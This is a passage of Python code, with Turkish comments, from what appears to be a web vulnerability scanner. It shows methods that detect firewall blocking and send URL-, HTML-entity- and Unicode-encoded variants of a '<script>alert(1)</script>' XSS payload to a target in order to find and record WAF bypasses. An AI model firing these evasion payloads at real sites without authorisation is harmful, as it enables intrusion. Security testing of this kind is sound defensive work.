    def _is_blocked(self, resp):
        """Yanıtın WAF tarafından bloklanıp bloklanmadığını kontrol eder."""
        if not resp:
            return True
        if resp.status_code in [403, 406, 501, 999]:
            return True
        blocked_phrases = [
            "blocked", "forbidden", "access denied", "not acceptable",
            "captcha", "security check", "attention required", "challenge",
        ]
        text = resp.text.lower()
        return any(p in text for p in blocked_phrases)

    def _register_bypass(self, title, description, payload, evidence, response_text=""):
        """Başarılı bypass'ı kaydeder."""
        self.reporter.add_finding(
            vuln_type="WAF_BYPASS",
            severity="HIGH",
            title=title,
            description=description,
            evidence=evidence,
            url=self.target,
        )
        self.bypass_results.append({
            "title": title,
            "payload": payload,
            "evidence": evidence,
            "response": response_text[:300],
        })
        print(f"    {Colors.RED}[!!!] BYPASS BAŞARILI: {title}{Colors.RESET}")

    def _test_encoding_bypass(self):
        """Çoklu encoding bypass testleri."""
        print(f"\n  {Colors.BLUE}[*] Encoding bypass testleri...{Colors.RESET}")

        base_payload = "<script>alert(1)</script>"
        variants = [
            ("URL-Encode", quote(base_payload, safe='')),
            ("Double-URL-Encode", quote(quote(base_payload, safe=''), safe='')),
            ("Partial-Encode", base_payload.replace("<", "%3C").replace(">", "%3E")),
            ("HTML-Entity", "&#60;script&#62;alert(1)&#60;/script&#62;"),
            ("Hex-Entity", "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"),
            ("Mixed-Encode", "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
            ("Unicode-Encode", "%u003Cscript%u003Ealert(1)%u003C/script%u003E"),
        ]

        for name, payload in variants:
            test_url = f"{self.target}?kaxie_test={payload}"
            resp = self._make_request(test_url)
            if resp and not self._is_blocked(resp):
                if payload.lower() in resp.text.lower() or base_payload.lower() in resp.text.lower():
                    self._register_bypass(
                        f"WAF Encoding Bypass ({name})",
                        f"{name} ile WAF filtresi atlatıldı.",
                        payload,
                        f"Variant: {name}, Status: {resp.status_code}",
                        resp.text,
                    )
                    return

